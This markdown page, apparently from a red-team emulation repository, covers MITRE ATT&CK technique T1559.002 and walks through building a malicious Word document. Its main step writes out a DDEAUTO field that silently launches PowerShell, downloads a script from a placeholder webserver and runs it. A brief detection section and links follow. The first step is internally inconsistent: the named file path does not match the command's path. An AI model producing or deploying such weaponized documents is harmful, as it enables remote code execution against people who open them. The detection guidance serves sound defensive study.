# [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002/)

## Exploit Syntax: 

1. Create a file called /tmp/gross.txt

   ```powershell
   echo "Rick: Is that Mountain Dew in my quantum transport solution?        Morty: I-I saw you were marking the levels so I had to top it off        Rick: Top it off? Do you know how dangerously toxic this stuff is? And you added it to my portal fluid?" > c:\users\Portal.txt
   ```
2. Host the file on posh as a text/html

3. Open a Microsoft Word Document on a Windows machine

4. Navigate to the tool bar the at top and select the insert tab

   ![pic](../../Resources/gifs/Insert_Tab.gif)

5. Under Quick Parts dropdown select Field then press ok.

   <img src="/Resources/gifs/Step2_Adding_Object-720p.gif" alt="dog" width="800" height="60" title="dog">


6. Right Click toggle field codes and paste the contents below within the `{}` :
    ```powershell 
    { DDEAUTO "C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString('http://[webserver ip:port]/[saved ps1 file].ps1');powershell $e # " "Oooohwee!"}
    ```
    > NOTE: Nake sure to set your url and file name 

   <img src="/Resources/gifs/Step3_Adding_DDEAuto-720p.gif" alt="addingobject" width="800">

7. Save the document.
---
## Detection Method

1. Investigate embedded code within `Microsoft Office` applications
Searching for `winword.exe` with the `/dde` flag in the command line should indicate a DDE execution. 

2. The `winword.exe` event PID should be the PPID of another process, demonstrating that this DDE flag launched another process (in our case, it launches powershell)


---
## Resources    
* https://www.securitysift.com/abusing-microsoft-office-dde/
* https://1337red.wordpress.com/using-the-dde-attack-with-powershell-empire/
* https://blog.2code-monte.co.uk/2021/03/17/creating-a-cyber-attack-part-9-making-a-malicious-word-document-using-dde-and-powershell/
